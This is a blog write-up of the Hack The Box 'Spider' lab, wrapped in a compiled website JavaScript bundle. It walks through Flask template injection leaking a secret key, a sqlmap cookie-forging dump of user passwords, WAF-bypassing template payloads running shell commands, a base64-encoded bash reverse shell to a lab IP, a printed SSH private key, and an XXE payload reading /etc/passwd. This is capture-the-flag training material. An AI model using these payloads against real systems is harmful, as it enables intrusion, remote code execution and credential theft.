"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[8942],{3905:function(e,t,n){n.d(t,{Zo:function(){return d},kt:function(){return h}});var a=n(67294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,a,i=function(e,t){if(null==e)return{};var n,a,i={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var o=a.createContext({}),p=function(e){var t=a.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},d=function(e){var t=p(e.components);return a.createElement(o.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},c=a.forwardRef((function(e,t){var n=e.components,i=e.mdxType,l=e.originalType,o=e.parentName,d=r(e,["components","mdxType","originalType","parentName"]),c=p(n),h=i,m=c["".concat(o,".").concat(h)]||c[h]||u[h]||l;return n?a.createElement(m,s(s({ref:t},d),{},{components:n})):a.createElement(m,s({ref:t},d))}));function h(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var l=n.length,s=new Array(l);s[0]=c;var r={};for(var o in t)hasOwnProperty.call(t,o)&&(r[o]=t[o]);r.originalType=e,r.mdxType="string"==typeof e?e:i,s[1]=r;for(var p=2;p<l;p++)s[p]=n[p];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}c.displayName="MDXCreateElement"},90356:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return r},contentTitle:function(){return o},metadata:function(){return p},assets:function(){return d},toc:function(){return u},default:function(){return h}});var a=n(87462),i=n(63366),l=(n(67294),n(3905)),s=["components"],r={title:"HTB Spider writeup",description:"writeup of Spider box from Hackthebox",image:"https://0xdedinfosec.github.io/hackthebox/spider/spider.png",authors:["shivam"],slug:"spider",tags:["SSTI","flask","flask-unsign","sqlmap","xml"]},o=void 0,p={permalink:"/Cybernotes/blog/spider",source:"@site/blog/2022-02-27-Spider/Spider.md",title:"HTB Spider writeup",description:"writeup of Spider box from Hackthebox",date:"2022-02-27T00:00:00.000Z",formattedDate:"February 27, 2022",tags:[{label:"SSTI",permalink:"/Cybernotes/blog/tags/ssti"},{label:"flask",permalink:"/Cybernotes/blog/tags/flask"},{label:"flask-unsign",permalink:"/Cybernotes/blog/tags/flask-unsign"},{label:"sqlmap",permalink:"/Cybernotes/blog/tags/sqlmap"},{label:"xml",permalink:"/Cybernotes/blog/tags/xml"}],readingTime:6.325,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{title:"HTB Spider writeup",description:"writeup of Spider box from Hackthebox",image:"https://0xdedinfosec.github.io/hackthebox/spider/spider.png",authors:["shivam"],slug:"spider",tags:["SSTI","flask","flask-unsign","sqlmap","xml"]},prevItem:{title:"Vulnhub SAR-1 writeup",permalink:"/Cybernotes/blog/sar-1"},nextItem:{title:"Vulnhub troll-1 writeup",permalink:"/Cybernotes/blog/troll-1"}},d={authorsImageUrls:[void 0]},u=[{value:"Nmap results",id:"nmap-results",children:[],level:2},{value:"Gobuster results",id:"gobuster-results",children:[],level:2},{value:"Enumration",id:"enumration",children:[],level:2},{value:"sqlmap",id:"sqlmap",children:[],level:2},{value:"flask reverse shell",id:"flask-reverse-shell",children:[{value:"Why we used include and % ?",id:"why-we-used-include-and--",children:[],level:4}],level:2},{value:"XML entity injection",id:"xml-entity-injection",children:[{value:"but wait where we will inject this payload ?",id:"but-wait-where-we-will-inject-this-payload-",children:[],level:4}],level:2},{value:"Resources",id:"resources",children:[],level:2}],c={toc:u};function h(e){var t=e.components,r=(0,i.Z)(e,s);return(0,l.kt)("wrapper",(0,a.Z)({},c,r,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("p",null,"Hello everyone,"),(0,l.kt)("p",null,"Today we are going to solve the spider machine from Hackthebox. we will learn about SSTI in flask,flask-unsign with cookies,dumping data with sqlmap and XML entity injection"),(0,l.kt)("p",null,(0,l.kt)("img",{parentName:"p",src:"https://0xdedinfosec.github.io/hackthebox/spider/spider.png",alt:null})),(0,l.kt)("h2",{id:"nmap-results"},"Nmap results"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)\n|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)\n|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://spider.htb/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n")),(0,l.kt)("p",null,"--\x3e It's redirecting us to ",(0,l.kt)("inlineCode",{parentName:"p"},"spider.htb")," so Let's add it in ",(0,l.kt)("inlineCode",{parentName:"p"},"/etc/hosts")),(0,l.kt)("p",null,"--\x3e Got this website on port ",(0,l.kt)("inlineCode",{parentName:"p"},"80")),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(71004).Z,width:"1920",height:"883"})),(0,l.kt)("hr",null),(0,l.kt)("h2",{id:"gobuster-results"},"Gobuster results"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},"===============================================================\n/cart                 (Status: 500) [Size: 290]\n/checkout             (Status: 500) [Size: 290]\n/index                (Status: 500) [Size: 290]\n/login                (Status: 200) [Size: 1832]\n/logout               (Status: 302) [Size: 209] [--\x3e http://spider.htb/]\n/main                 (Status: 500) [Size: 290]\n/product-details      (Status: 308) [Size: 275] [--\x3e http://spider.htb/product-details/]\n/register             (Status: 200) [Size: 2130]\n/user                 (Status: 302) [Size: 219] [--\x3e http://spider.htb/login]\n/view                 (Status: 302) [Size: 219] [--\x3e http://spider.htb/login]\n===============================================================\n2021/11/05 13:30:13 Finished\n===============================================================\n")),(0,l.kt)("hr",null),(0,l.kt)("h2",{id:"enumration"},"Enumration"),(0,l.kt)("p",null,"--\x3e I tried to register with the username and password and then logged in . After that i saw that we can see the user info in ",(0,l.kt)("inlineCode",{parentName:"p"},"user information")," tab and it's assigning unique ",(0,l.kt)("inlineCode",{parentName:"p"},"UUID")," for each user."),(0,l.kt)("p",null,"--\x3e I tried the basic SSTI payload ",(0,l.kt)("inlineCode",{parentName:"p"},"{{config}}")," and registered with this name and found that we can see the config files."),(0,l.kt)("p",null,"==> Note: Name must be smaller than 10 characters."),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'RATELIMIT_ENABLED': True, 'RATELIMIT_DEFAULTS_PER_METHOD': False, 'RATELIMIT_SWALLOW_ERRORS': False, 'RATELIMIT_HEADERS_ENABLED': False, 'RATELIMIT_STORAGE_URL': 'memory://', 'RATELIMIT_STRATEGY': 'fixed-window', 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset', 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After', 'UPLOAD_FOLDER': 'static/uploads'}>\n")),(0,l.kt)("p",null,"--\x3e I found the secret key in this file :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\n")),(0,l.kt)("p",null,"--\x3e After searching for the variables like ",(0,l.kt)("inlineCode",{parentName:"p"},"SESSION_COOKIE_SAMESITE"),", ",(0,l.kt)("inlineCode",{parentName:"p"},"PERMANENT_SESSION_LIFETIME"),",",(0,l.kt)("inlineCode",{parentName:"p"},"RATELIMIT_HEADERS_ENABLED")," i found that this website is using ",(0,l.kt)("inlineCode",{parentName:"p"},"flask")," in backend."),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(24211).Z,width:"1223",height:"745"})),(0,l.kt)("p",null,"--\x3e Cookies :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6ImNlNGQzYmI5LWIyZTktNDQwZi1iZWQ0LWRhMDliY2I5MzlmNiJ9.YYe9Ig.Vk7ey7efv0ElIaByDhNcfndwkWY\n")),(0,l.kt)("p",null,"After decoding :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-json"},'{ "cart_items": [], "uuid": "ce4d3bb9-b2e9-440f-bed4-da09bcb939f6" }\n')),(0,l.kt)("p",null,"--\x3e Let's add something in cart and see the changes in the cookies"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-json"},'{ "cart_items": ["1"], "uuid": "ce4d3bb9-b2e9-440f-bed4-da09bcb939f6" }\n')),(0,l.kt)("p",null,"So it's changing the cookies on interaction with cart"),(0,l.kt)("h2",{id:"sqlmap"},"sqlmap"),(0,l.kt)("p",null,"--\x3e I found ",(0,l.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting/pentesting-web/flask"},"this")," Blog but ",(0,l.kt)("inlineCode",{parentName:"p"},"flask-unsign")," is not working in my system so i will continue with ",(0,l.kt)("inlineCode",{parentName:"p"},"sqlmap")," command which you can find ",(0,l.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval"},"here")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"sqlmap http://1.1.1.1/sqli --eval \"from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')\" --cookie=\"session=*\" --dump\n")),(0,l.kt)("p",null,"Let's modify it"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"sqlmap http://spider.htb/ --eval \"from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')\" --cookie=\"session=*\" --dump\n")),(0,l.kt)("p",null,"--\x3e After running the sqlmap i got these results :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"Parameter: Cookie #1* ((custom) HEADER)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: session=' AND (SELECT 5244 FROM (SELECT(SLEEP(5)))JJSC) AND 'oNCX'='oNCX\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 2 columns\n    Payload: session=' UNION ALL SELECT CONCAT(0x716b766b71,0x67664d595359566c6672695942626f6852685967434b53624f6b46744d654868624357724f477069,0x7162706a71)-- -\n---\n\nDatabase: shop\nTable: users\n[5 entries]\n+----+--------------------------------------+------------+-----------------+\n| id | uuid                                 | name       | password        |\n+----+--------------------------------------+------------+-----------------+\n| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |\n| 2  | ce4d3bb9-b2e9-440f-bed4-da09bcb939f6 | {{config}} | hacker          |\n| 3  | 0ef61829-d721-4fb7-b77d-1c822759b859 | hack       | hacker          |\n| 4  | 8188a43e-e335-4904-b7e8-14adb9a746c7 | hecker     | hecker          |\n| 5  | b5826318-5d52-48a8-981b-5d54baf52896 | {{config}} | {{config}}      |\n+----+--------------------------------------+------------+-----------------+\n\nDatabase: shop\nTable: messages\n[1 entry]\n+---------+---------+-----------------------------------------------------------------------------------+---------------------+\n| post_id | creator | message                                                                           | timestamp           |\n+---------+---------+-----------------------------------------------------------------------------------+---------------------+\n| 1       | 1       | Fix the <b>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</b> portal! | 2020-04-24 15:02:41 |\n+---------+---------+-----------------------------------------------------------------------------------+---------------------+\n")),(0,l.kt)("h2",{id:"flask-reverse-shell"},"flask reverse shell"),(0,l.kt)("p",null,"--\x3e We got the password of ",(0,l.kt)("inlineCode",{parentName:"p"},"chiv")," so Let's try to login as SSH"),(0,l.kt)("p",null,"But it didn't worked :/"),(0,l.kt)("p",null,"--\x3e So then i tried to login with ",(0,l.kt)("inlineCode",{parentName:"p"},"UUID")," and password on website and i got the admin panel."),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(73).Z,width:"1920",height:"731"})),(0,l.kt)("p",null,"--\x3e There is a one message in messages"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"Fix the /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal portal!\n")),(0,l.kt)("p",null,"So it might be some directory so let's go into this"),(0,l.kt)("p",null,"and it is generating the support ticket"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(17414).Z,width:"1035",height:"773"})),(0,l.kt)("p",null,"--\x3e Then i tried to add ",(0,l.kt)("inlineCode",{parentName:"p"},"{{config}}")," but WAF is filtering that so we have to find some payload which bypasses the WAF and i found one ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"},"here")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')(\"id\")|attr('read')()}}\n")),(0,l.kt)("p",null,"--\x3e But i found that it's filtering the single quote ",(0,l.kt)("inlineCode",{parentName:"p"},"'")," also so let's try with double quote ",(0,l.kt)("inlineCode",{parentName:"p"},'"')),(0,l.kt)("p",null,"New payload :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},'{% include request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fbuiltins\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fimport\\x5f\\x5f")("os")|attr("popen")("sleep 5")|attr("read")()%}\n')),(0,l.kt)("h4",{id:"why-we-used-include-and--"},"Why we used include and % ?"),(0,l.kt)("p",null,"get your answer ",(0,l.kt)("a",{parentName:"p",href:"https://pythonprogramming.net/flask-includes-tutorial/"},"here")),(0,l.kt)("p",null,"--\x3e And we got 5 seconds sleep !"),(0,l.kt)("p",null,"--\x3e So let's get the reverse shell using this payload ."),(0,l.kt)("p",null,"But we need to ",(0,l.kt)("inlineCode",{parentName:"p"},"base64 encode")," the reverse shell because it's not working directly because of special characters"),(0,l.kt)("p",null,"So now our payload looks like this"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},'{% include request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fbuiltins\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fimport\\x5f\\x5f")("os")|attr("popen")("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjIvNjk2OSAwPiYxCg== | base64 -d | bash\n")|attr("read")()%}\n')),(0,l.kt)("p",null,"--\x3e we need to url encode this also"),(0,l.kt)("p",null,"--\x3e And i got the reverse shell and ",(0,l.kt)("inlineCode",{parentName:"p"},"user")," flag"),(0,l.kt)("p",null,"I also got the ssh key for chiv"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV\ngjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS\nU7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9\nMI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7\nBLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2\nVTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu\n6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs\nhx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl\nZ5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc\nXVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq\n54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy\nf0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62\nnKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL\nj0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO\nJjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW\nK1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv\nhm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ\nmQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8\ngu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb\n0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2\nnfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W\nCeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG\nrbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO\nTTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6\nIleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==\n-----END RSA PRIVATE KEY-----\n")),(0,l.kt)("p",null,"--\x3e And i also found that there is a port ",(0,l.kt)("inlineCode",{parentName:"p"},"8080")," running internally and i found it using ",(0,l.kt)("inlineCode",{parentName:"p"},"netstat -anp")," command"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(35561).Z,width:"1437",height:"475"})),(0,l.kt)("p",null,"--\x3e So let's forward this port and let's see what we get !"),(0,l.kt)("h2",{id:"xml-entity-injection"},"XML entity injection"),(0,l.kt)("p",null,"And i found this beta login page"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(6417).Z,width:"1663",height:"705"})),(0,l.kt)("p",null,"so Let's login as ",(0,l.kt)("inlineCode",{parentName:"p"},"admin")," user witout giving password"),(0,l.kt)("p",null,"--\x3e and we got logged in !"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(41054).Z,width:"1841",height:"836"})),(0,l.kt)("p",null,"--\x3e After some searching i found this cookies which looks weird"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},".eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YYlYJQ.cq3IvEiTsuVC9kD_QCCpldA_qHQ\n")),(0,l.kt)("p",null,"--\x3e Let's decode it with ",(0,l.kt)("inlineCode",{parentName:"p"},"flask-unsign")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"flask-unsign --deocde --cookie <cookie>\n")),(0,l.kt)("p",null,"--\x3e After decoding it i got this :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YWRtaW48L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg==', 'points': 0}\n")),(0,l.kt)("p",null,"--\x3e Let's decode value of ",(0,l.kt)("inlineCode",{parentName:"p"},"lxml")," which looks ",(0,l.kt)("inlineCode",{parentName:"p"},"base64")," because of ",(0,l.kt)("inlineCode",{parentName:"p"},"=")," at the end"),(0,l.kt)("p",null,"--\x3e and we have ",(0,l.kt)("inlineCode",{parentName:"p"},"XML")," data !"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(93033).Z,width:"1909",height:"303"})),(0,l.kt)("p",null,"--\x3e So let's try ",(0,l.kt)("inlineCode",{parentName:"p"},"xml entity injection")," payloads after intercepting the request"),(0,l.kt)("p",null,"i found this payload :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>\n")),(0,l.kt)("p",null,"--\x3e But for that we have to login as ",(0,l.kt)("inlineCode",{parentName:"p"},"&admin;")," because the payload requires it"),(0,l.kt)("h4",{id:"but-wait-where-we-will-inject-this-payload-"},"but wait where we will inject this payload ?"),(0,l.kt)("p",null,"--\x3e So for that let's intercept the login request"),(0,l.kt)("p",null,"and this is what i got :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"POST /login HTTP/1.1\nHost: localhost:8000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 34\nOrigin: http://localhost:8000\nConnection: close\nReferer: http://localhost:8000/login\nCookie: __test=1; session=eyJwb2ludHMiOjB9.YYldfw.MlhlWFVe5ZLZX9fJ1u3Kr3CV5cI\nUpgrade-Insecure-Requests: 1\n\nusername=%26admin%3B&version=1.0.0\n")),(0,l.kt)("p",null,"--\x3e Here there are 2 parameters ",(0,l.kt)("inlineCode",{parentName:"p"},"username")," and ",(0,l.kt)("inlineCode",{parentName:"p"},"version")," and i found that ",(0,l.kt)("inlineCode",{parentName:"p"},"version")," is reflecting in first tags in ",(0,l.kt)("inlineCode",{parentName:"p"},"xml")," and ",(0,l.kt)("inlineCode",{parentName:"p"},"username")," is reflecting between ",(0,l.kt)("inlineCode",{parentName:"p"},"<username></username>")," so we have to inject the payload in ",(0,l.kt)("inlineCode",{parentName:"p"},"version")," because ",(0,l.kt)("inlineCode",{parentName:"p"},"<!DOCTYPE>")," must be at first tag"),(0,l.kt)("p",null,"so my payload is looking like this :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"value=1.0.2--\x3e<!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///etc/passwd'>]>\x3c!--\n")),(0,l.kt)("p",null,"so now ",(0,l.kt)("inlineCode",{parentName:"p"},"xml")," look like this :"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"<!API version 1.0.2--\x3e<!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///etc/passwd'>]>\x3c!----\x3e\n#and other stuff after this\n")),(0,l.kt)("p",null,"--\x3e and boom we got content of ",(0,l.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," !"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(60023).Z,width:"1713",height:"885"})),(0,l.kt)("p",null,"--\x3e So now let's read the flag which is in ",(0,l.kt)("inlineCode",{parentName:"p"},"/root/root.txt")),(0,l.kt)("p",null,"--\x3e and boom we got the root flag !"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(84741).Z,width:"1527",height:"819"})),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"c208888f258c21bfdf59c8d4099fd3a1\n")),(0,l.kt)("p",null,"--\x3e If you need better shell then just grab the ",(0,l.kt)("inlineCode",{parentName:"p"},"id_rsa")," and get the ssh shell"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(55280).Z,width:"789",height:"239"})),(0,l.kt)("hr",null),(0,l.kt)("h2",{id:"resources"},"Resources"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"},"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"},"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"))))}h.isMDXComponent=!0},71004:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211107063106-4b7ae1d3219b2083c92f1e4ceea045bd.png"},24211:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211107064501-173d37cd64c96aafa6f0978fe791e189.png"},73:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211107075253-acd1da64b25880a1e8e1d08c6901bf06.png"},17414:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211107075443-2cf0f92b39a27ce8654481c9eb7dab37.png"},35561:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211107104452-506a9940415d620d49b484d30361a36f.png"},6417:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211108120028-264c9ccf78c11b0fd059d35f42428314.png"},41054:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211108120130-f486ac9e50e217cc1376f0a56a36c2c9.png"},93033:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211108121618-70c7036740b572b0e427a44f60fd17b2.png"},60023:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211108123051-197e16082ac6b17dfe0dd7811e01065c.png"},84741:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211108123443-47925cb6876ec21a5972d7de4d5bc632.png"},55280:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211108124059-e88a0683439446d77a7144